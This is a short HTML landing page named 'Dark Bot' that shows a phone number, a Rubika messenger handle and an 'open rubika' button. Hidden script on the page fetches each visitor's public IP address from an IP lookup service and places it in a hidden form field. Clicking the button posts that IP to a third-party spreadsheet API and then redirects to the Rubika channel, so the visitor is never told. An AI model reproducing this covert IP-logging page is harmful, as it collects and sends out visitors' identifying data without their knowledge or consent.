<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dark Bot</title>
<style>
  body {
    background-color: black;
    color: white;
    font-family: Arial, sans-serif;
    text-align: center;
    margin: 0;
    padding: 0;
  }
  .content {
    padding: 100px;
  }
  button{
  	background:gray;
  color:white;
  outline:none;
  border:none;
  padding:5px;
  border-radius:5px;
  	}
</style>
</head>
<script src="https://sheetdb.io/handlebars.js"></script>
<script>
    	async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    document.getElementById('po').value = data.ip;
  } catch (error) {
    console.error('hello:', error);
  }
}
getUserIP();
</script>
<script>
	function show(){
		window.location.href = 'https://Rubika.ir/Dark_robot';
		}
	</script>
<body>
<form method="post" action="https://sheetdb.io/api/v1/c1ji8pd734zwo" id="sheetdb-form">
   <input id="po" name="data[ip]" hidden>
<div class="content">
  <h1>Dark Bot</h1>
  <p>09359223850</p>
  <p>Rubika: dark_robot</p>
  <button type="submit" onclick="show()">open rubika</button>
</div>
</form>
</body>
</html>
